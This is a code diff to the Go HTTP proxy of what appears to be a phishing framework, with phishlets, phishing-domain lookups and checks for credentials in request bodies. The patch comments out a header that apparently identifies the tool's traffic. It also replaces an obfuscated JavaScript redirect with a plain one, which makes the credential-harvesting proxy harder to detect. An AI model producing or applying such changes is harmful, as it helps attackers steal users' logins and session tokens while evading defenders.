@@ -468,7 +468,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -658,7 +658,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1315,17 +1315,17 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	obfJS := `
-		<script>
-			(function() {
-				var redirectFunction = function(url) {
-					var _0x5f2c=["\\x74\\x6F\\x70","\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E","\\x68\\x72\\x65\\x66"];
-					window[_0x5f2c[0]+"."+_0x5f2c[1]+"."+_0x5f2c[2]]=url;
-				};
-				redirectFunction('%s');
-			})();
-		</script>`
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'>"+obfJS+"</head><body></body></html>", rurl)
+	// obfJS := `
+	// 	<script>
+	// 		(function() {
+	// 			var redirectFunction = function(url) {
+	// 				var _0x5f2c=["\\x74\\x6F\\x70","\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E","\\x68\\x72\\x65\\x66"];
+	// 				window[_0x5f2c[0]+"."+_0x5f2c[1]+"."+_0x5f2c[2]]=url;
+	// 			};
+	// 			redirectFunction('%s');
+	// 		})();
+	// 	</script>`
+	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
@@ -1807,9 +1807,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// func (p *HttpProxy) getHomeDir() string {
+// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+// }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
